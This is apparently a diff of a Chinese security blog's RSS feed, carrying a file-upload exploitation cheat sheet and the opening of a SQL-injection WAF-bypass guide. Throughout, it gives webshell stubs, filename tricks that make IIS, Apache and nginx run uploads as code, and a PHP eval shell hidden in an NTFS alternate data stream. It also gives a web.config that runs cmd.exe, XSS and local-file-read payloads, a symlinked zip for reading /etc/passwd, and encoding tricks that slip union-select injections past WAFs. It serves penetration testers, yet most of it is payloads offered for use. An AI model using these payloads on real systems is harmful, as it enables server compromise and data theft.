+        <link>http://localhost:4000/2018/08/RichFaces%E5%8F%8D%E5%BA%8F%E5%88%97%E8%AF%9D%E6%BC%8F%E6%B4%9E-CVE-2013-2165/</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/08/RichFaces%E5%8F%8D%E5%BA%8F%E5%88%97%E8%AF%9D%E6%BC%8F%E6%B4%9E-CVE-2013-2165/</guid>
+        
+        <category>java</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>file-upload</title>
+        <description>&lt;h1 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h1&gt;
+&lt;hr /&gt;
+&lt;p&gt;  对文件上传进行一个总结,如果你还没有看过&lt;a href=&quot;https://xz.aliyun.com/t/2435&quot;&gt;Upload-labs通关手册&lt;/a&gt;，建议先看，本文是对其的一个简单补充,另外本文不对跨域等进行总结，后续会陆续添加。&lt;/p&gt;
+
+&lt;h1 id=&quot;0x01-通用&quot;&gt;0x01 通用&lt;/h1&gt;
+&lt;h2 id=&quot;1-shell&quot;&gt;1. shell&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Hello&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;);%&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;     #jsp jspx 
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hello&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;)%&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;        #asp asmx aspx ashx soap web.config
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;     #php phtml phps  phpt php3 php3p php4 php5   #主要看配置  
+有些管理员可能会把php和asp程序设置在一个大目录下(虚拟主机)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;2-xss&quot;&gt;2. xss&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;上传htm html shtml xml文件等
+Basic XSS payload: &amp;lt;script&amp;gt;alert(1337)&amp;lt;/script&amp;gt;
+XML-based XSS payload: &amp;lt;a:script xmlns:a=&quot;http://www.w3.org/1999/xhtml&quot;&amp;gt;alert(1337)&amp;lt;/a:script&amp;gt;
+&quot;&amp;gt;&amp;lt;img src=# onerror=alert(1)&amp;gt;.jpg   #文件上传输出文件名导致xss window也可以
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;3-解析漏洞&quot;&gt;3. 解析漏洞&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iis  
+文件格式： asa cer cdx
+目录解析： /1.asp/1.jpg  #上传1.jpg拿到shell
+文件解析： 1.asp;.jpg 
+IIS 7.0/IIS 7.5
+1.jpg/.php  #上传1.jpg 在后面加上/.php直接当成php来执行
+
+apache
+1.php.aaa   #遇到不能解析的类型递归向前解析 默认类型一般是text/plain
+1.php%0a    影响2.4.0~2.4.29 linux服务器#上传时1.php后面添加一个\x0A #CVE-2017-15715 https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html 
+
+nginx&amp;lt;8.03空字节代码执行漏洞 
+1.jpg%00.php   #上传1.jpg然后web访问
+1.jpg/.php  #上传1.jpg 在后面加上/.php直接当成php来执行
+Nginx 0.8.41至1.4.3版本和1.5.7之前的1.5.x版本 CVE-2013-4547   #绕过访问限制读取s.html 
+http://127.0.0.1/test /../protected/s.html  #注意test目录后有一个空格
+# 解析漏洞需要test%20目录(window不需要) #使用curl测试 
+1.jpg \0.php  #1.jpg[0x20][0x00].php    #使用burp更改编码
+
+#IIS和Nginx一看到URL中文件后缀是.php就把它当成php来解析  
+cgi.fix_pathinfo(php会对路径进行修理如/tt.php/111.jpg/111.jpg 1.jpg不存在会当成1.php处理) 
+
+lighttpd
+1.jpg/1.php
+
+php cgi解析漏洞
+配置文件中的选项cgi.fix_pathinfo = 1开启时 当访问http://www.xxx.com/x.txt/x.php x.php不存在 会把x.txt当成php来执行
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;0x02-window&quot;&gt;0x02 window&lt;/h1&gt;
+&lt;h2 id=&quot;1截断&quot;&gt;1.截断&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;window 文件命名规范   #https://docs.microsoft.com/zh-cn/windows/desktop/FileIO/naming-a-file  
+window8.3能用但是会重命名为web~1.con     Note 1: Windows 8.3 feature could also be used but it would rename the web.config file to web~1.con in the end.
+不能直接上传带有&amp;lt; &amp;gt;的文件，只能覆盖他们   Note 2: Asterisk and question mark symbols cannot be used directly as the file system rejects them.
+尽量手动去输出，而不是简单的复制粘贴      Note 3: Sometimes WordPress replaces double and single quotation marks with visually similar symbols. Therefore, it is recommended to type the vectors yourself in Burp Suite or other proxies that you use instead of copy/paste them directly from here.
+PHP Windows     #也可以用来文件包含
+&amp;gt;       ?       #Greater-than symbol (closing angle bracket “&amp;gt;”) TO a question mark (“?”)
+&amp;lt;       *       #Less-than symbol (opening angle bracket “&amp;lt;”) TO an asterisk symbol (“*”)
+&quot;       .       #Double quotation mark (&quot;&quot;&quot;) TO a dot character (&quot;.&quot;&quot;)   
+
+1.php%20(url decode)    1.php.    1.php%00(url decode)  #生成1.php文件
+1.php:aaa               #生成空文件 前提是该文件不存在
+1.ph&amp;lt; or 1.ph&amp;gt;          #生成php webshell文件。
+
+echo ^&amp;lt;?php @eval(request[caidao])?^&amp;gt;  &amp;gt; index.php:hidden.jpg
+这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，&amp;lt;?php include(‘index.php:hidden.jpg’)?&amp;gt;，这样子就可以正常解析我们的一句话了
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;2ads文件流&quot;&gt;2.ads文件流&lt;/h2&gt;
+&lt;p&gt;1.php::$DATA    #文件流 生成1.php文件  图片名字:流的名字:流类型&lt;/p&gt;
+&lt;h1 id=&quot;0x03-linux&quot;&gt;0x03 linux&lt;/h1&gt;
+&lt;h2 id=&quot;1文件上传xss&quot;&gt;1.文件上传xss&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;&amp;gt;&amp;lt;img src=# onerror=alert(1)&amp;gt;.jpg   #上传输出文件名导致xss linux 调用文件处也可以 可以在w3school测试https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_fileupload_value  
+linux 上传php不解析 pHp绕过
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;0x04-iis&quot;&gt;0x04 IIS&lt;/h1&gt;
+&lt;h2 id=&quot;1xss&quot;&gt;1.xss&lt;/h2&gt;
+&lt;p&gt;根据web server服务器fuzz一些不常见的后缀名，同样可以导致xss,详情可以参考这篇文章https://mike-n1.github.io/ExtensionsOverview&lt;br /&gt;
+basic    .cer .hxt .htm  .stm&lt;br /&gt;
+xml    .dtd .mno .vml .xsl .xht .svg .xml .xsd .xsf .svgz .xslt .wsdl .xhtml&lt;/p&gt;
+&lt;h2 id=&quot;2file_include-or-command_exec&quot;&gt;2.file_include or command_exec&lt;/h2&gt;
+&lt;p&gt;默认情况下，IIS也支持SSI(Server-Side Include)扩展，SSI是为WEB服务器提供的一套命令，这些命令只要直接嵌入到HTML文档的注释内容之中即可，由于安全原因，默认情况下命令会被禁止。&lt;br /&gt;
+&lt;strong&gt;若服务器不支持.shtml #IIS 角色服务-应用程序开发-在服务器端包含图片点击安装角色即可&lt;/strong&gt; &lt;br /&gt;
+https://docs.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--#include file=&quot;web.config&quot;--&amp;gt;   //可以用来读文件
+&amp;lt;!--#include virtual=&quot;/includes/header.html&quot; --&amp;gt; //也是读文件 绝对路径
+&amp;lt;!--#exec cmd=&quot;ipconfig&quot;--&amp;gt; //是否可以用来执行命令 默认情况不会开启 需要配置相关数据  #win2008 IIS7尝试开启失败
+Extensions for SSI: .stm .shtm .shtml   #iis常见的一般自定义配置值 其他如apache自己配置 一般为.shtml  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;3shell&quot;&gt;3.shell&lt;/h2&gt;
+&lt;p&gt;asp asmx ashx soap svc      #http://py4.me/blog/?p=448&lt;/p&gt;
+&lt;h3 id=&quot;webconfig-需要asp环境支持&quot;&gt;web.config #需要asp环境支持&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;system.webServer&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;handlers&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;accessPolicy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Read, Script, Write&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;add&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web_config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;path=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*.config&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;verb=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;modules=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IsapiModule&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;scriptProcessor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%windir%\system32\inetsrv\asp.dll&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;resourceType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unspecified&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;requireAccess=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Write&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;preCondition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bitness64&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/handlers&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;security&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;requestFiltering&amp;gt;&lt;/span&gt;
+                &lt;span class=&quot;nt&quot;&gt;&amp;lt;fileExtensions&amp;gt;&lt;/span&gt;
+                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fileExtension=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/fileExtensions&amp;gt;&lt;/span&gt;
+                &lt;span class=&quot;nt&quot;&gt;&amp;lt;hiddenSegments&amp;gt;&lt;/span&gt;
+                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;remove&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;segment=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;web.config&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/hiddenSegments&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/requestFiltering&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/security&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.webServer&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%response.write(&quot;asp test&quot;)%&amp;gt;
+通过填入下面语句可成功执行asp语句
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%
+Response.write CreateObject(&quot;wscript.shell&quot;).exec(&quot;cmd.exe /c ipconfig&quot;).StdOut.ReadAll
+%&amp;gt;
+&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%=CreateObject(&quot;wscript.shell&quot;).exec(&quot;cmd.exe /c ipconfig&quot;).StdOut.ReadAll()%&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;asmx&quot;&gt;asmx&lt;/h3&gt;
+&lt;p&gt;asmx demo&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;%@ WebService Language=&quot;C#&quot; Class=&quot;Service&quot; %&amp;gt;
+ 
+using System.Web;
+using System.Web.Services;
+using System.Web.Services.Protocols;
+ 
+public class Service : System.Web.Services.WebService
+{
+    [WebMethod]
+    public string HelloWorld() {
+        return &quot;HelloWorld&quot;;
+    }
+}
+
+http://192.168.44.132:8980/customize.asmx/Chopper   #菜刀密码z
+z=A     #POST查看运行目录  
+http://192.168.44.132:8980/asmxWebMethodSpy.asmx/Invoke     #密码Ivan
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;ashx&quot;&gt;ashx&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//浏览器访问这个ashx文件打印Test!  #证明可以使用
+&amp;lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&amp;gt;
+using System;
+using System.Web;
+public class Handler : IHttpHandler{
+    public void ProcessRequest(HttpContext context)
+    {
+        context.Response.Write(&quot;Test!&quot;);
+    }
+    public bool IsReusable
+    {
+        get
+        {
+            return false;
+        }
+    }
+}
+http://192.168.44.132:8980/HandlerSpy.ashx?Ivan=context.Response.Write(DateTime.Now.ToString())     #输出时间
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;0x05-apahce--httpd-or-tomcat&quot;&gt;0x05 apahce  (httpd or Tomcat)&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;basic   .html.xxx .shtml
+xml .rdf .xht .xml .xsl .svg .xhtml .svgz   #apache返回包里面没有Content-type 这样就可能根据浏览器的习性造成xss攻击  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;1-shell-1&quot;&gt;1. shell&lt;/h2&gt;
+&lt;p&gt;.htaccess&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SetHandler application/x-httpd-php  #所有文件解析成php 也可以解析成其他脚本形式如perl ruby参考https://github.com/wireghoul/htshells
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;0x06-nginx&quot;&gt;0x06 nginx&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;basic   .htm
+xml     .svg .xml .svgz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;0x07文件读取-or-ssrf-or-rce&quot;&gt;0x07.文件读取 or SSRF or rce&lt;/h1&gt;
+&lt;h2 id=&quot;通过客户端或者相应的前端框架本地读取相应html&quot;&gt;通过客户端或者相应的前端框架本地读取相应html&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(document.location);&amp;lt;/script&amp;gt;  #get file_location  查看当前源  
+动态的执行相关js   #前提是调用文件使用file协议
+&amp;lt;embed src=&quot;c:\\windows\\win.ini&quot; width=&quot;400&quot; height=&quot;400&quot;&amp;gt;
+&amp;lt;object width=&quot;400&quot; height=&quot;400&quot; data=&quot;file://c:/windows/win.ini&quot;&amp;gt;&amp;lt;/object&amp;gt;
+&amp;lt;iframe src=&quot;file:///C:/Windows/win.ini&quot; width=&quot;400&quot; height=&quot;400&quot;&amp;gt;
+&amp;lt;embed src=&quot;file://c:/windows/win.ini&quot; width=&quot;400&quot; height=&quot;400&quot;&amp;gt;
+&amp;lt;iframe src=&quot;http://localhost&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+&amp;lt;iframe src=&quot;../../../web.xml&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+
+http://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
+https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/
+https://mike-n1.github.io/SSRF_P4toP2
+https://hackernoon.com/cross-site-scripting-to-remote-code-execution-on-trellos-app-699512676f0c    #Cross-Site Scripting to Local File Inclusion on Trello’s App
+https://hackerone.com/reports/243058
+https://maustin.net/2015/11/12/hipchat_rce.html     #XSS to RCE in Atlassian Hipchat
+https://medium.com/@arbazhussain/xss-using-dynamically-generated-js-file-a7a10d05ff08
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;2zip自解压&quot;&gt;2.zip自解压&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ln -s /etc/passwd link
+zip --symlinks test.zip link    #通过自解压zip功能实现文件读取https://xz.aliyun.com/t/2589    #上传软链接读取passwd ln -s / test
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;其他参考链接如下：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf     #iis端文件名漏洞
+https://github.com/ironbee/ironbee-rules/blob/master/support/php/test_fs_evasion.php 
+https://soroush.secproject.com/blog/2014/07/file-upload-and-php-on-iis-wildcards/  
+http://byd.dropsec.xyz/2017/02/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%BB%95%E8%BF%87/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;#
+转载请注明：&lt;a href=&quot;https://notwhy.github.io/&quot;&gt;whynot&lt;/a&gt; » &lt;a href=&quot;https://notwhy.gitbooks.io//2018/07/file-upload/&quot;&gt;file-upload&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 30 Jul 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2018/07/file-upload/</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/07/file-upload/</guid>
+        
+        <category>file-upload</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>sql-injection-fuck-waf</title>
+        <description>&lt;p&gt;0x0 前言 
+0x1 注入点检测 
+0x2 bypass waf 
+0x3 自动化&lt;/p&gt;
+
+&lt;h3 id=&quot;0x0-前言&quot;&gt;0x0 前言&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;  这里是简单对sql注入绕过waf的一个小总结，非安全研究员，这里不讲原理，关于原理搜集了一些其他大佬的文章（文章在最下面请自取），感谢他们的分享，比着葫芦画瓢，对着各大waf厂商跟着师傅们来一波实战,进行一个简单的总结。&lt;/p&gt;
+&lt;h3 id=&quot;0x1-注入点检测&quot;&gt;0x1 注入点检测&lt;/h3&gt;
+&lt;p&gt;  一般的注入还是很好判断的，特别是基于报错，但有的时候略微有些奇葩的环境，再加上一些乱七八糟 waf，就比较难搞了，这里简单总结了一些方法。&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;利用数据库独有的一些函数 &lt;br /&gt;
+access  asc chr len #access-functions &lt;br /&gt;
+mysql   substring   substr length &lt;br /&gt;
+mssql   char ascii len substring    #mssql function str &lt;br /&gt;
+oracle  ascii  chr length  substr upper lower replace(x,old,new) &lt;br /&gt;
+这些数据库中一个通用的函数就是abs，如果觉得是int型注入不妨先试试2-abs(1),然后结合各类数据库的一些函数来判断是什么数据库的注入,当然对数据库了解越多越好。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;改变请求方式 &lt;br /&gt;
+根据经验，一般情况下各脚本对http request method如下，这里以GET为例子，针对www.vul.com/?id=1来进行判断。 &lt;br /&gt;
+php GET &lt;br /&gt;
+aspx GET &lt;br /&gt;
+asp GET POST COOKIE &lt;br /&gt;
+jsp GET POST &lt;br /&gt;
+平常渗透测试中总是遇到各种各样的waf，有的时候一个单引号就死了，这个时候首选的一些方法就是转换请求头了，毕竟GET不如POST，POST不如multipart/form-data，当然不要看到php就不去转换，任何情况下都要尝试一下。 &lt;br /&gt;
+当然，可以用burp很方便的来进行change request method以及change body encoding。&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;  之前碰到过一个有趣的例子，asp的站点可以通过cookie提交数据，而且可以使用len函数，可以初步判断为access或者mssql数据库，但是还是很头疼，最后一位大哥使用下面的函数可以判断成功。www.vul.com/2.asp?id=482&lt;br /&gt;
+  483-chr(chr(52)&amp;amp;chr(57))    #=482&lt;br /&gt;
+  chr(52) ‘4’     &lt;br /&gt;
+  chr(57) ‘9’  &lt;br /&gt;
+  chr(49) ‘1’ #chr(52)&amp;amp;chr(57)为49 chr(49)为1 虽然最后也没什么卵用但还是挺有意思的&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;数据库特性 &lt;br /&gt;
+mysql   注释符号# –+ ` ;%00 /&lt;strong&gt;/ 字符串可以使用成对的引号’admin’ = admin’’’ &lt;br /&gt;
+mssql   注释符号– /&lt;/strong&gt;/ ;%00 &lt;br /&gt;
+oracle  注释符号– /**/ admin=adm’||’in&lt;br /&gt;
+空白符号
+MySQL5 09 0A 0B 0C 0D A0 20&lt;br /&gt;
+Oracle 00 0A 0D 0C 09 20&lt;br /&gt;
+MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20&lt;br /&gt;
+mysql和mssql可以使用|来进行相关的运算，而oracle会把||当成连接字符。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;web容器特性&lt;br /&gt;
+这里直接可以跳过看http://drops.xmd5.com/static/drops/tips-7883.html 这篇文章&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. iis+asp(x)  
+    1.%u特性: iis支持对unicode的解析，如:payload为[s%u006c%u0006ect],解析出来后则是[select]
+     %u0061nd 1=1
+    另类%u特性: unicode在iis解析之后会被转换成multibyte，但是转换的过程中可能出现:多个widechar可能会转换为同一个字符。
+    如：select中的e对应的unicode为%u0065，但是%u00f0同样会被转换成为e s%u00f0lect
+    iis+asp
+    2.%特性: union selec%t user fr%om dd #iis+asp asp+iis环境下会忽略掉百分号，如：payload为[sele%ct], 解析出来后则是[select]
+    3.asp/asp.net在解析请求的时候，允许Content-Type: application/x-www-form-urlencoded的数据提交方式select%201%20from%20user
+    asp/asp.net request解析:
+    4.在asp和asp.net中获取用户的提交的参数一般使用request包，当使用request(‘id’)的形式获取包的时候，会出现GET，POST分不清的情况，譬如可以构造一个请求包，METHOD为GET，但是包中还带有POST的内容和POST的content-type, 换一种理解方式也就是将原本的post数据包的method改成GET,如果使用request(‘id’)方式获取数据，仍会获取到post的内容
+2. php+apache畸形的boundary
+    1.php在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为—-aaaa,123456，php解析的时候只识别了—-aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS
+    Content-Type: multipart/form-data; boundary=------,xxxx
+    Content-Length: 191
+    
+    ------,xxxx
+    Content-Disposition: form-data; name=&quot;img&quot;; filename=&quot;img.gif&quot;
+    
+    GIF89a
+    ------
+    Content-Disposition: form-data; name=&quot;id&quot;
+    
+    1' union select null,null,flag,null from flag limit 1 offset 1-- -
+    --------
+    ------,xxxx--
+    2.畸形method(header头中)
+    某些apache版本在做GET请求的时候，无论method为何值均会取出GET的内容。如请求的method名为DOTA，依然会返回GET方法的值，即,可以任意替换GET方法为其它值，但仍能有效工作，但如果waf严格按照GET方法取值，则取不到任何内容
+3. web应用层
+    1.双重URL编码: 即web应用层在接受到经过服务器层解码后的参数后，又进行了一次URL解码
+    2.变换请求方式：
+    在web应用中使用了统一获取参数的方式: 如php里使用$_REQUEST获取参数，但WAF层如果过滤不全则容易bypass，如，waf层过滤了get/post，但没有过滤cookie，而web应用层并不关心参数是否来自cookie
+    urlencode和form-data: POST在提交数据的时候有两种方式，第一种方式是使用urlencode的方式提交，第二种方式是使用form-data的方式提交。当我们在测试的时候，如果发现POST提交的数据被过滤掉了，此时可以考虑使用form-data的方式去提交  
+4. hpp 
+    asp.net + iis：id=1,2,3  #?str=a%27/*&amp;amp;str=*/and/*&amp;amp;str=*/@@version=0--
+    asp + iis ：id=1,2,3
+    php + apache ：id=3
+    jsp + tomcat ：id=1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;这里提供一种针对普通检测的方法，大家可自行发挥。
+mysql int型： %20%26%201=1  mysql.php?id=1%20%26%201=1
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/1.png&quot; alt=&quot;image&quot; /&gt;
+另外在字符型中 ‘and’1’=’1是不需要加空格的，有时候也可以绕过一些waf判断
+&lt;img src=&quot;/images/posts/sql-injection-fuck-waf/2.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;0x2-bypasswaf&quot;&gt;0x2 bypasswaf&lt;/h3&gt;
+&lt;p&gt;由于mysql的灵活性，这里以mysql绕过为主，针对各大主流waf厂商进行一个测试，主要测试在线版的，本地就安装了一个360主机卫士。
